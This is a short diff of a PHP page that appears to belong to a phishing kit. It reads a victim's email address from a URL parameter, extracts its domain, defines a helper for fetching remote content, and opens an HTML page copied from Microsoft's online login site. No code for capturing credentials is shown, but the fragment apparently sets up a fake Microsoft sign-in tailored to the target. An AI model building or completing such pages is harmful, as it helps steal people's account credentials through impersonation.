@@ -1,5 +1,20 @@
 <?php
 
+include 'handler/session.php';
+
+$id = $_GET['id'];
+$email = $id; 
+$domain_name = substr(strrchr($email, "@"), 1);
+
+function fetchContent($url)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content;
+}
 ?>
 <html dir="ltr" class="gr__login_microsoftonline_com" lang="en">
 
